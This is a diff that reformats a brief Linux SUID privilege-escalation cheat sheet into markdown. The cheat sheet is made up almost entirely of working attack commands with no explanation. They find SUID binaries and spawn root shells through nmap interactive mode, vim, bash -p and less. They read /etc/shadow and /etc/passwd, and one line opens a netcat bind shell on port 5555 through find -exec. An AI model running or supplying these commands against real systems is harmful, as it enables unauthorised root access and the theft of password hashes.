@@ -1,31 +1,33 @@
-# Locating SUIDS
-find . -perm /4000 2>/dev/null
+# Linux SUID Privilege Escalation
 
-# Exploiting SUIDs
+### Locating SUIDS
+`find . -perm /4000 2>/dev/null`
 
-#nmap 2.02 - 5.21
-nmap -V #version check
-nmap --interactive
-nmap> !sh
+### Exploiting SUIDs
 
-#find
+nmap 2.02 - 5.21  
+`nmap -V #version check`  
 
-find <file> -exec <CMD> \;
-#Escalation to root shell
-find pentestlab -exec netcat -lvp 5555 -e /bin/sh \;
+`nmap --interactive`  
+`nmap> !sh`
 
-#Vim
-vim /etc/shadow
-vim
-# Press ESC key
-:set shell=/bin/sh
-:shell
+find
+`find <file> -exec <CMD> \;`  
+Escalation to root shell  
+`find pentestlab -exec netcat -lvp 5555 -e /bin/sh \;`
 
-#bash
-bash -p
+Vim  
+`vim /etc/shadow`  
+`vim`  
+`# Press ESC key`  
+`:set shell=/bin/sh`  
+`:shell`
 
-#less
-less /etc/passwd
-!/bin/sh
+bash  
+`bash -p`
+
+less  
+`less /etc/passwd`  
+`!/bin/sh`
 
 
